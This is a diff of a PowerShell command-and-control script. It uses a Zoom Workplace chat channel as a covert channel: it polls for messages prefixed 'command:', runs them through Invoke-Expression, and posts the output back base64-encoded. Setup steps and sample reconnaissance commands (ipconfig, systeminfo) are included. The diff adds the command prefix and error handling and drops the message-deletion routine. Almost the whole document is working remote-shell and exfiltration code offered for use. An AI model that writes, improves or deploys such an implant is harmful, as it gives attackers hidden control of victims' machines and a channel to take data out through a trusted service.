@@ -30,11 +30,14 @@
         > click Create a channel
         > Fill in the channel name into CONFIGURATION section below
 
-    8) Run the script, input cmd shell commands into the channel chat. Then wait for response in Unicode base64.
+    8) Run the script. To execute commands, start with "command:" like shown in examples below
+		> command: ipconfig
+		> command: hostname
+		> command: systeminfo
 
     9) To decode responses in Zoom Workplace channel:
-        > Use the powershell command [Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(“base64 here”))
-        > Or CyberChef Recipe From Base64 + Decode text encoding UTF-16LE (1200)
+        > Use the powershell command [Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(“base64 here”))
+        > Or CyberChef Recipe From Base64
 
 
 ###########################################################################################################>
@@ -53,38 +56,48 @@
     Get-LatestMessage
     Uses $AccessToken and $ChannelId to get the latest message in the channel.
 
-    Delete-Message
-    Delete message to keep the chat clean to receive next instructions
-
     Send-Message
     Send response to chat after executing instructions
-    
 
 ######################################################################################################>
 
 # ===== CONFIGURATION =====
-$AccountId   = "<See Workflow Step 5>"
-$ClientId    = "<See Workflow Step 5>"
-$ClientSecret= "<See Workflow Step 5>"
-$ChannelName = "<See Workflow Step 7>"
+$AccountId   = "From_Workflow_Step_5"
+$ClientId    = "From_Workflow_Step_5"
+$ClientSecret= "From_Workflow_Step_5"
+$ChannelName = "From_Workflow_Step_7"
 
 # ===== FUNCTIONS =====
 
 function Get-AccessToken 
 {
-    $auth = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("${ClientId}:${ClientSecret}"))
+    try 
+    {
+        $auth = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("${ClientId}:${ClientSecret}"))
 
-    $body = @{
-        grant_type = "account_credentials"
-        account_id = $AccountId
+        $body = @{
+            grant_type = "account_credentials"
+            account_id = $AccountId
+        }
+
+        $response = Invoke-RestMethod -Method Post `
+            -Uri "https://zoom.us/oauth/token" `
+            -Headers @{ Authorization = "Basic $auth" } `
+            -Body $body -ErrorAction Stop
+
+        if (-not $response.access_token) 
+        {
+            throw "Zoom did not return an access token. Response: $($response | ConvertTo-Json -Depth 5)"
+        }
+
+        return $response.access_token
     }
 
-    $response = Invoke-RestMethod -Method Post `
-        -Uri "https://zoom.us/oauth/token" `
-        -Headers @{ Authorization = "Basic $auth" } `
-        -Body $body
-
-    return $response.access_token
+    catch 
+    {
+        Write-Error "[-] Failed to get Zoom Access Token: $($_.Exception.Message)"
+        return $null
+    }
 }
 
 function Get-ChannelIdFromName($token, $channelName) 
@@ -115,23 +128,27 @@ function Get-LatestMessage($token, $channelId)
     if ($resp.messages.Count -gt 0) 
     {
         $msg = $resp.messages[0]
-        #Write-Host "Latest message in channel: [$($msg.sender)] $($msg.message)"
-        return $msg
+
+        if ($msg.message.StartsWith("command:", [System.StringComparison]::OrdinalIgnoreCase)) 
+        {
+            
+            return $msg
+        }
+
+        else 
+        {
+            Write-Host "[.] No instructions found in channel yet." -ForegroundColor DarkYellow
+            Write-Host ""
+            return $null
+        }
     }
+    
     else 
     {
-        Write-Host "No instructions found in channel yet."
+        Write-Host "[.] No instructions found in channel yet." -ForegroundColor DarkYellow
         Write-Host ""
         return $null
     }
-
-}
-
-function Delete-Message($token, $messageId, $channelId) 
-{
-    $url = "https://api.zoom.us/v2/chat/users/me/messages/$($messageId)?to_channel=$channelId"
-    #Write-Host "Debug: Attempt to delete message via URL now: $url"
-    Invoke-RestMethod -Uri $url -Method DELETE -Headers @{ Authorization = "Bearer $token" } | Out-Null
 }
 
 function Send-Message($token, $channelId, $text) 
@@ -156,11 +173,12 @@ Start-Sleep -Seconds 5
 
 # Get Channel ID from Channel Name
 $ChannelId   = Get-ChannelIdFromName $AccessToken $ChannelName
-Start-Sleep -Seconds 5
 
 Write-Host ""
-Write-Host "Monitoring channel '$ChannelName' (ID: $ChannelId)..."
+Write-Host "[+] Monitoring channel '$ChannelName' (ID: $ChannelId)" -ForegroundColor Green
 Write-Host ""
+
+Start-Sleep -Seconds 5
 
 while ($true) 
 {
@@ -168,7 +186,7 @@ while ($true)
     $msg = Get-LatestMessage $AccessToken $ChannelId
     Start-Sleep -Seconds 5
 
-    #Debug: Write-Host $msg
+    #Write-Host "DEBUG: $msg"
 
     if ($null -ne $msg) 
     {
@@ -177,46 +195,23 @@ while ($true)
         $sender = $msg.sender
 
         # If there's a message, run instructions based on the message contents
-        if (![string]::IsNullOrWhiteSpace($text)) 
+        if ($text.StartsWith("command:"))
         {
-            Write-Host "[+] New instructions: $text"
-            Write-Host ""
+            Write-Host "[+] New instructions: $($text.Substring(8).Trim())" -ForegroundColor Green
 
             # Run instructions
-            $command = $msg.message
+            $command = $msg.message.Substring(8).Trim()
             $commandOutput = Invoke-Expression $command | Out-String
 
             # Prepare output to be sent
             # Trim blank spaces at the end of the content > then convert to base64
-            $body = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandOutput))
+            $body = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($commandOutput))
 
-            Start-Sleep -Seconds 12
-
-            # Delete message
-            Write-Host "... Deleting instructions ..."
-            Write-Host ""
-            Delete-Message $AccessToken $msgId $ChannelId
-
-            Start-Sleep -Seconds 12
+            Start-Sleep -Seconds 10
 
             # Send command output
             Send-Message $Accesstoken $ChannelId $body
-            Write-Host " ... Instructions output sent! ..."
-            Write-Host ""
-            Write-Host " !!! Copy the instructions output now. It will be auto-deleted in 20 seconds !!! "
-            Write-Host ""
-
-            Start-Sleep -Seconds 10
-            
-            # Get latest message ID to delete
-            $msg = Get-LatestMessage $AccessToken $ChannelId
-            $msgId = $msg.id
-
-            Start-Sleep -Seconds 10
-
-            # Delete command output
-            Delete-Message $AccessToken $msgId $ChannelId
-            Write-Host " ... Instructions output deleted ... "
+            Write-Host "[+] Instructions output sent" -ForegroundColor Green
             Write-Host ""
         }
     }
